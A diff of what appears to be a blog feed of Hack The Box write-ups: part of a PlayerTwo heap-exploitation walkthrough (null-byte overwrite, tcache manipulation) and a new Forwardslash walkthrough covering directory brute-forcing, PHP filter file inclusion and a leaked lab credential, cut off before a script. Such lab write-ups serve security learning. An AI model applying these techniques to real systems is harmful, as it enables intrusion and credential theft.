+&lt;h2 id=&quot;playing-the-game-protobs-part-2&quot;&gt;Playing the game, Protobs part 2&lt;/h2&gt;
 &lt;p class=&quot;text-justify&quot;&gt;In the following the exploitation of the binary via a double free will be presented. It is also possible to exploit the binary by coalesing two chunks, which is shown here &lt;a href=&quot;#Appendix&quot;&gt;[Appendix]&lt;/a&gt;.&lt;/p&gt;
 &lt;ul class=&quot;text-justify&quot;&gt;
   &lt;li&gt;As ASLR is enabled on the machine we need to leak a libc address in order to get the libc base address from which we can calculate the addresses of the free hook and the system function.&lt;/li&gt;
@@ -303,14 +580,14 @@ Each tcache can hold 7 same-size chunks when freed before it puts other freed ch
 &lt;p&gt;Analog procedure for &lt;em&gt;system&lt;/em&gt;.&lt;/p&gt;
 &lt;h3 id=&quot;null-byte-overwrite-vulnerability&quot;&gt;Null byte overwrite vulnerability&lt;/h3&gt;
 &lt;p class=&quot;text-justify&quot;&gt;Looking at the binary in &lt;em&gt;Ghidra&lt;/em&gt; we notice in the function that creates a new config that once the game description is longer or equal to the chosen description size &lt;em&gt;n&lt;/em&gt; it is terminated by a null byte at the &lt;em&gt;n+1st&lt;/em&gt; position. However malloc allocates a chunk of size &lt;em&gt;n&lt;/em&gt; and then writes &lt;em&gt;n+1&lt;/em&gt; bytes.&lt;/p&gt;
-&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uint&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__dest&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x28&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sVar5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;		&lt;span class=&quot;err&quot;&gt;#&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;length&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;of&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;the&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;description&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;say&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x30&lt;/span&gt; 
-	&lt;span class=&quot;n&quot;&gt;local_428&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uint&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__dest&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x28&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;'\0'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 	&lt;span class=&quot;err&quot;&gt;#&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;It&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;contains&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x30&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bytes&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;of&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x00&lt;/span&gt;
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uint&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__dest&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x28&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sVar5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;		
+	&lt;span class=&quot;n&quot;&gt;local_428&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uint&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__dest&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x28&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;'\0'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;	&lt;span class=&quot;err&quot;&gt;#&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;adding&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;'\0'&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;to&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;description&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;of&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;
 &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;pvVar4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;malloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ulong&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uint&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__dest&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x28&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;	&lt;span class=&quot;err&quot;&gt;#&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;allocates&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x30&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bytes&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;of&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;
-&lt;span class=&quot;nf&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; 
-	&lt;span class=&quot;n&quot;&gt;sVar6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;local_428&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;			&lt;span class=&quot;err&quot;&gt;#&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sets&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sVar6&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;to&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x31&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bytes&lt;/span&gt; 
-	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sVar6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ulong&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 
-	&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lVar1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;local_428&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;#&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;writes&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x31&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bytes&lt;/span&gt;  
+&lt;span class=&quot;n&quot;&gt;pvVar4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;malloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ulong&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uint&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__dest&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x28&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;	
+&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; 
+	&lt;span class=&quot;n&quot;&gt;sVar6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;local_428&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;			&lt;span class=&quot;err&quot;&gt;#&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sets&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sVar6&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;to&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bytes&lt;/span&gt; 
+	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sVar6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ulong&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 	&lt;span class=&quot;err&quot;&gt;#&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;breaks&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;after&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bytes&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;were&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;written&lt;/span&gt;
+	&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lVar1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;local_428&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; 
 	&lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
@@ -340,7 +617,7 @@ For this we create a sample of two configs of size 0x38 and write 0x38 bytes of 
   
 &lt;/figure&gt;
 
-&lt;p class=&quot;text-justify&quot;&gt;So to get two descriptions adjacent I thought that since the config name always needs a chunk of size 0x30 of usable size (which is 0x41 in memory): If I allocate one or two configs with description size 0x30 and free them the next configs with description sizes bigger than 0x30 might use the freed 0x30 chunks from config name + description to store their new chonfig names in but allocate the descriptions after all the previously allocated chunks. The code and result might clarify what I just tried to explain with words:&lt;/p&gt;
+&lt;p class=&quot;text-justify&quot;&gt;So to get two descriptions adjacent I thought that since the config name always needs a chunk of size 0x30 of usable size (which is 0x41 in memory): If I allocate one or two configs with description size 0x30 and free them the next configs with description sizes bigger than 0x30 might use the just freed 0x30 chunks but allocate the descriptions after all the previously allocated chunks. The code and result might clarify what I just tried to explain with words:&lt;/p&gt;
 &lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x38&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x38&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x38&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;	&lt;span class=&quot;c1&quot;&gt;# A's will be 41 in memory
 &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x38&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;B&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x38&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;B&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x38&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;	&lt;span class=&quot;c1&quot;&gt;# B's 42, 0x38 = 3*16+8 = 56 bytes
 &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
@@ -741,10 +1018,220 @@ To do this we need to allocte and free two dummies of size 0x30 (also 0x41 in me
 
 &lt;p&gt;&lt;a name=&quot;[2]&quot;&gt;[2]&lt;/a&gt; &lt;a href=&quot;https://www.nullbyte.cat/post/babyheap-def-con-ctf-qualifier-2019/&quot;&gt;Another source of useful write-ups&lt;/a&gt;&lt;/p&gt;
 
-&lt;p&gt;&lt;a name=&quot;[3]&quot;&gt;[3]&lt;/a&gt; &lt;a href=&quot;https://www.youtube.com/watch?v=43ewpRBIRgA&quot;&gt;RCE via tcache poisoning&lt;/a&gt;&lt;/p&gt;</content><author><name>Philipp Menner</name></author><category term="heap" /><category term="binary exploitation" /><category term="linux" /><summary type="html">Write-up of the box PlayerTwo from Hack The Box</summary></entry><entry><title type="html">TEST TEST</title><link href="http://localhost:4000/challenges/template/" rel="alternate" type="text/html" title="TEST TEST" /><published>2020-05-23T11:33:36-04:00</published><updated>2020-05-23T11:33:36-04:00</updated><id>http://localhost:4000/challenges/template</id><content type="html" xml:base="http://localhost:4000/challenges/template/">&lt;p&gt;TEST&lt;/p&gt;
+&lt;p&gt;&lt;a name=&quot;[3]&quot;&gt;[3]&lt;/a&gt; &lt;a href=&quot;https://www.youtube.com/watch?v=43ewpRBIRgA&quot;&gt;RCE via tcache poisoning&lt;/a&gt;&lt;/p&gt;</content><author><name>Philipp Menner</name></author><category term="heap" /><category term="binary exploitation" /><category term="linux" /><summary type="html">Write-up of the box PlayerTwo from Hack The Box</summary></entry><entry><title type="html">HackTheBox - Forwardslash</title><link href="http://localhost:4000/boxes/forwardslash/" rel="alternate" type="text/html" title="HackTheBox - Forwardslash" /><published>2020-06-26T21:33:36-04:00</published><updated>2020-06-26T21:33:36-04:00</updated><id>http://localhost:4000/boxes/forwardslash</id><content type="html" xml:base="http://localhost:4000/boxes/forwardslash/">&lt;p&gt;Fowardslash was a nice hard box where we had to find a hidden backup domain to gain remote access on the machine. The root part included bruteforcing a cipher, which revealed the key to mount an encrypted partition that contained a root ssh private key.&lt;/p&gt;
 
-&lt;p&gt;TEST
-Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy eirmod tempor invidunt ut labore et dolore magna aliquyam erat, sed diam voluptua. At vero eos et accusam et justo duo dolores et ea rebum. Stet clita kasd gubergren, no sea takimata sanctus est Lorem ipsum dolor sit amet. Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy eirmod tempor invidunt ut labore et dolore magna aliquyam erat, sed diam voluptua. At vero eos et accusam et justo duo dolores et ea rebum. Stet clita kasd gubergren, no sea takimata sanctus est Lorem ipsum dolor sit amet.&lt;/p&gt;</content><author><name>Billy Rick</name></author><category term="challenge" /><summary type="html">TEST</summary></entry><entry><title type="html">HackThebox - ServMon</title><link href="http://localhost:4000/boxes/ServMon/" rel="alternate" type="text/html" title="HackThebox - ServMon" /><published>2020-05-23T11:33:36-04:00</published><updated>2020-05-23T11:33:36-04:00</updated><id>http://localhost:4000/boxes/ServMon</id><content type="html" xml:base="http://localhost:4000/boxes/ServMon/">&lt;h1 id=&quot;overview&quot;&gt;Overview&lt;/h1&gt;
+&lt;h1 id=&quot;nmap-scans&quot;&gt;NMAP scans&lt;/h1&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://files.nuclino.com/files/bd99b3a0-788e-43b2-94f8-52b42aefaf4b/b7301415-1c0d-48ed-935f-33a38696cb52.png&quot; alt=&quot;b7301415-1c0d-48ed-935f-33a38696cb52.png&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Only port 80 open, must be interesting&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;basic-enumeration&quot;&gt;Basic enumeration&lt;/h1&gt;
+
+&lt;p&gt;The default page of the index.php:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://files.nuclino.com/files/9312fb05-e8ed-42ed-86e1-6af3b67392fe/616af91c-4c09-4d56-9c3c-54acd44cbf77.png&quot; alt=&quot;616af91c-4c09-4d56-9c3c-54acd44cbf77.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Get get some hints that we might need to do an XXE or exploit an FTP server.&lt;/p&gt;
+
+&lt;p&gt;Continuing to fuzz, we get &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/note.txt&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://files.nuclino.com/files/b4fcbd39-60dc-4e41-8f30-a89b628ca32d/b7b80b02-6e84-480c-b27e-7d4f6c0921f1.png&quot; alt=&quot;b7b80b02-6e84-480c-b27e-7d4f6c0921f1.png&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Probably the first user on the machine: chiv&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Using the backup hint, we add &lt;strong&gt;backup.forwardslash.htb&lt;/strong&gt; to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; to get that page or by bruteforcing possible VHOST names:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://files.nuclino.com/files/c61716b3-9097-4202-9feb-a4768a7cf566/b092ef37-508b-4815-8376-d7b4cf6bfcad.png&quot; alt=&quot;b092ef37-508b-4815-8376-d7b4cf6bfcad.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We can either create a user or an already existing user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pain:password&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Bruteforcing the dirs we get the following pages:&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;DirBuster 1.0-RC1 - Report
+Report produced on Mon Apr 06 17:37:08 CEST 2020
+&lt;span class=&quot;nt&quot;&gt;--------------------------------&lt;/span&gt;
+http://backup.forwardslash.htb:80
+&lt;span class=&quot;nt&quot;&gt;--------------------------------&lt;/span&gt;
+Dirs found with a 403 response:
+/icons/
+/dev/
+/icons/small/
+/server-status/
+&lt;span class=&quot;nt&quot;&gt;--------------------------------&lt;/span&gt;
+Files found with a 302 responce:
+/index.php
+/welcome.php
+/environment.php
+/logout.php
+/hof.php
+&lt;span class=&quot;nt&quot;&gt;--------------------------------&lt;/span&gt;
+Files found with a 200 responce:
+/login.php
+/register.php
+/api.php
+/config.php
+&lt;span class=&quot;nt&quot;&gt;--------------------------------&lt;/span&gt;
+Files found with a 403 responce:
+/dev/index.php
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Continuing to enumerate, I also found the profilepicture.php, which allows us to include an URL to change our profile picture.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://files.nuclino.com/files/c61ccb92-2a51-4bd5-be06-911a9bbf2355/8c56bb66-16d0-49c4-86fe-b0966e6b700c.png&quot; alt=&quot;8c56bb66-16d0-49c4-86fe-b0966e6b700c.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Since it is only HTML disabled, we can go ahead and enable it using the inspector HTML inspector in the browser to then intercept the request. Here we can see what it looks like. It looks like the author of the box thought of this exploit, so we get a sneaky little message that it won’t work this way:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://files.nuclino.com/files/ba84a697-128a-4ca5-b251-47e44a6746ae/c4721c46-0423-49c7-9093-33c931ce1847.png&quot; alt=&quot;c4721c46-0423-49c7-9093-33c931ce1847.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;At first I thought that we had to do some kind of XXE, as mentioned before, but it is way simpler to use PHP wrappers/filters to read the file. The &lt;a href=&quot;https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion&quot;&gt;swisskyrepo/PayloadsAllTheThings&lt;/a&gt; repo has a great collection:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://files.nuclino.com/files/a000439d-eb32-4a24-80f7-defe4fd477c6/638ffa93-d481-4d83-ad8a-3d484f7a0922.png&quot; alt=&quot;638ffa93-d481-4d83-ad8a-3d484f7a0922.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;This way we can read the source code of api.php, where we can find some creds:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://files.nuclino.com/files/a232553f-980d-4fc6-9fc8-a968455d2782/4b235659-62ff-47b4-9e2e-10f8d1e61761.png&quot; alt=&quot;4b235659-62ff-47b4-9e2e-10f8d1e61761.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Chiv:N0bodyL1kesBack&lt;/code&gt;/&lt;/p&gt;
+
+&lt;h1 id=&quot;getting-user-pain&quot;&gt;Getting user: pain&lt;/h1&gt;
+
+&lt;p&gt;SSH into the system and after some enumeration a binary has been found. It is called backup and can be executed by us and has the SUID bit set, therefore allowing us to execute it as the owner - pain.&lt;/p&gt;
+
+&lt;p&gt;Here’s what it does:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;It creates an MD5 Hash depending on the time&lt;/li&gt;
+  &lt;li&gt;The binary checks if a file has the same name as a hash at the created-time&lt;/li&gt;
+  &lt;li&gt;If correct, the contents of a file will be printed&lt;/li&gt;
+  &lt;li&gt;Creating a little python script, which looks like this, we can read the contents of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/backups/config.php.bak&lt;/code&gt;, which contains the creds of the user pain&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Using this little python script to read the contents:&lt;/p&gt;
+
